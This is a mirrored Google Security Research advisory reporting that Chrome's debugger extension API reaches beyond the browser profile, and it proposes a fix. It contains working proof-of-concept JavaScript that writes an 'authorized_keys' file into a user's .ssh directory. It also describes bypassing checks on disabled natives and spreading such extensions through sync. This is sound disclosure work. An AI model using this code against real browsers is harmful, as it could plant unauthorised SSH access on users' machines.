@@ -1,0 +1,55 @@
+id: 31388
+date: 10/23/2018
+title: Chrome Debugger Extension API Is Too Powerful Vulnerability
+author: Google Security Research
+cves: 
+
+Chrome: debugger extension API is too powerful 
+
+
+
+
+My understanding of Chrome's security model regarding extensions is as follows:
+
+Users can grant almost complete access to data that is stored inside a browser profile to extensions. Authorization for accessing such data is given through the prompt that lists extension permissions at install time.
+If the user is signed in on multiple devices and sync is active, an extension that is installed on one device will also silently be pushed to the other devices (unless prevented by an enterprise policy). This is supposed to be fine even if the devices are trusted to different degrees, or have different owners, because the pushed extension can only operate on the synced browser profile, not the rest of the machine.
+But if an extension can use the debugger permission to affect system state beyond the scope of the browser profile, this security model is violated.
+
+
+One function in the debugger API that clearly goes beyond the bounds of the current browser profile is "Page.setDownloadBehavior" (<a href="https://chromedevtools.github.io/devtools-protocol/tot/Page#method-setDownloadBehavior" title="" class="" rel="nofollow">https://chromedevtools.github.io/devtools-protocol/tot/Page#method-setDownloadBehavior</a>). Quoting the documentation:
+
+> Set the behavior when downloading a file.
+> PARAMETERS
+>   behavior: Whether to allow all or deny all download requests, or use default Chrome behavior if available (otherwise deny).deny, allow, default
+>   downloadPath: The default path to save downloaded files to. This is requred if behavior is set to 'allow'
+
+I have tested that this works; the following code, executed in the context of an extension with debugger permission, will drop a file called "authorized_keys" in /home/user/.ssh (unless such a file already exists); nonexistent directories will be created.
+
+chrome.tabs.create({url:'about:blank'},({id: child_id}) => {
+  let target = {tabId: child_id};
+  chrome.debugger.attach(target, '1.3', ()=>{
+    chrome.debugger.sendCommand(target, 'Page.setDownloadBehavior', {behavior:'allow', downloadPath:'/home/user/.ssh'}, (res) => {
+      chrome.debugger.sendCommand(target, 'Runtime.evaluate', {expression: `
+        var blob_url = URL.createObjectURL(new Blob(['hello world'], {type:'application/octet-stream'}));
+        document.body.innerHTML='<a download="authorized_keys" id=x href="'+blob_url+'">foo</a>';
+        x.click();
+      `}, (res) => { console.log('evaluate: ', res); });
+    });
+  });
+});
+
+Interestingly, this even works on Chrome OS; you can drop files in locations like /home/chronos or /media, even though normally not even the user can directly access /home/chronos (as far as I can tell).
+
+
+You can also use the debugger API to put a breakpoint in extensions::binding and grab references to local variables (like the "require" and "requireNative" functions), and synchronously call them to bypass the check for disabled natives. However, I'm not sure whether you can actually do anything particularly bad from that context. I'm attaching my demo code.
+
+
+The tip-of-tree API documentation also lists "Page.addCompilationCache" (<a href="https://chromedevtools.github.io/devtools-protocol/tot/Page#method-addCompilationCache" title="" class="" rel="nofollow">https://chromedevtools.github.io/devtools-protocol/tot/Page#method-addCompilationCache</a>), but that doesn't seem to be available in Chrome yet; it looks like this was only added a couple days ago (<a href="https://chromium.googlesource.com/chromium/src/+/155210a0f5fc6f6871ad1ecc1ce04333411ebd7e)?" title="" class="" rel="nofollow">https://chromium.googlesource.com/chromium/src/+/155210a0f5fc6f6871ad1ecc1ce04333411ebd7e)?</a> As far as I can tell, <a href="https://v8project.blogspot.com/2015/07/code-caching.html" title="" class="" rel="nofollow">https://v8project.blogspot.com/2015/07/code-caching.html</a> describes the same mechanism as used by this API; in the comments section (<a href="https://v8project.blogspot.com/2015/07/code-caching.html?showComment=1438070292453#c2899136651658395474" title="" class="" rel="nofollow">https://v8project.blogspot.com/2015/07/code-caching.html?showComment=1438070292453#c2899136651658395474</a>), a V8 developer explains that this API is not supposed to be exposed to untrusted data.
+
+
+I have tested that an extension with debugger permission can be propagated from one device to another via sync.
+
+
+Given that the debugger protocol seems to be developed under the assumption that it won't be exposed to untrusted code, I think a reasonable way to fix this would be to require stronger user consent, e.g. a commandline flag and a butterbar (similar to flags like --no-sandbox), before permitting the use of extensions with debugger permission.
+
+#  0day.today [2023-03-26]  #
